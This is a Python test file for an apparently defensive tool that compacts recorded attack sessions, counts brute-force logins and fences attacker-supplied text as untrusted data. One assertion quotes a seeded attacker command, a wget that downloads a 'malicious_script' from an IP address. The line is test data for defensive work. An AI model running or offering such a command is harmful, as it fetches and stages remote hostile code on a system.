import pytest

from app.seed.seeder import seed
from app.services.compaction import compact, render_untrusted_block
from app.services.session_builder import get_session_events


@pytest.mark.asyncio
async def test_compaction_keeps_every_command_citable() -> None:
    await seed(reset=True)
    events = await get_session_events("seed-botnet-01")
    compacted = compact(events)

    assert compacted.commands
    for command in compacted.commands:
        assert command.event_id
        assert command.timestamp


@pytest.mark.asyncio
async def test_compaction_deduplicates_repeats_but_keeps_counts() -> None:
    await seed(reset=True)
    events = await get_session_events("seed-brute-01")
    compacted = compact(events)

    assert compacted.failed_logins == 5
    assert compacted.successful_login is False


@pytest.mark.asyncio
async def test_compaction_is_deterministic() -> None:
    await seed(reset=True)
    events = await get_session_events("seed-botnet-01")

    assert render_untrusted_block(compact(events)) == render_untrusted_block(
        compact(events)
    )


@pytest.mark.asyncio
async def test_untrusted_block_fences_attacker_text() -> None:
    await seed(reset=True)
    events = await get_session_events("seed-botnet-01")
    block = render_untrusted_block(compact(events))

    assert "BEGIN UNTRUSTED DATA" in block
    assert "END UNTRUSTED DATA" in block
    assert "wget http://198.51.100.7/malicious_script" in block
    assert "seed-botnet-01-008" in block


@pytest.mark.asyncio
async def test_compaction_records_the_first_event_id() -> None:
    await seed(reset=True)
    events = await get_session_events("seed-brute-01")
    compacted = compact(events)

    assert compacted.first_event_id == events[0].id
    assert compacted.commands == []
